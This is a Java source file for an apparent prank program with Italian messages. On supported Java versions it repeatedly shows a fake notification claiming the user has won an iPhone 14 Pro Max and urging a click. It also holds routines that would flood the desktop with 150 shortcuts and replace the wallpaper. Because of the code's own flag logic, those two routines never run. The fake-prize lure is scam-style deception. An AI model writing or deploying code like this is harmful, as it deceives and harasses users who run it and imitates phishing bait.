import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;

public class Main {
    public static String resources = new File("").getAbsolutePath() + "\\src\\resources";

    public static void main(String[] args) {
        boolean execute;

        if("11".compareTo(System.getProperty("java.version")) <= 0) {
            System.out.println("Versione di Java supportata. Attuale: " + System.getProperty("java.version"));
            execute = false;
        } else {
            Exception e = new Exception("Versione di Java non supportata. Utilizzare almeno la 11 (la 19 Ã¨ quella consigliata). Attuale: " + System.getProperty("java.version"));
            e.printStackTrace();
            execute = true;
            System.exit(0);
        }

        if(!execute) {
            Notification notification = new Notification(
                    resources + "\\notification\\icon.png",
                    "Sei un fortunato vincitore!",
                    "Hai vinto un iPhone 14 Pro Max. Clicca la notifica per ottenerlo"
            );

            Thread thread = new Thread(() -> {
                for(int i=0; i<40; i++) {
                    try {
                        notification.showNotification();
                    } catch (IOException | URISyntaxException | AWTException e) {
                        e.printStackTrace();
                    }
                }
            });

            thread.start();
        } //Notification

        if(execute) {
            for(int i=0; i<150; i++) {
                try{
                    Shortcut.createShortcut(
                            "END" + i,
                            resources + "\\redir\\END.txt",
                            resources + "\\redir\\END.ico");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        } //Shortcut

        if(execute) {
            User32.INSTANCE.SystemParametersInfo(0x0014, 0, resources + "\\background\\bg.jpg" , 1);
        } //Wallpaper

        if(!execute) {
            System.out.println("Sei salvo, per ora.");
        }
    }
}